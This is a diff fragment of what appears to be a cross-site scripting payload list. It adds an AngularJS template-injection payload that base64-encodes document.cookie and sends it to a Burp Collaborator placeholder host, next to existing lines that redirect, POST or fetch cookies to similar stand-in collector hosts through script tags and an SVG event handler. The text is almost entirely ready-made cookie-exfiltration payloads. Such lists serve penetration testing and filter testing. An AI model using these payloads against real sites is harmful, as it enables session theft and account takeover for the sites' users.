@@ -138,6 +138,9 @@ ${document.location='https://<BURP-COLLAB>/?cookies'+document.cookie;}
 <script>fetch(`https://<BURP-COLLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
 <script>fetch(`https://<EXPLOIT-SV>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
 
+//angularJS
+{{constructor.constructor('fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));')()}}
+
 <svg><animateTransform onbegin=fetch('https://<BURP-COLLAB>?cookie='+btoa(document.cookie))>
 
 // tags / atributtes blacklisted
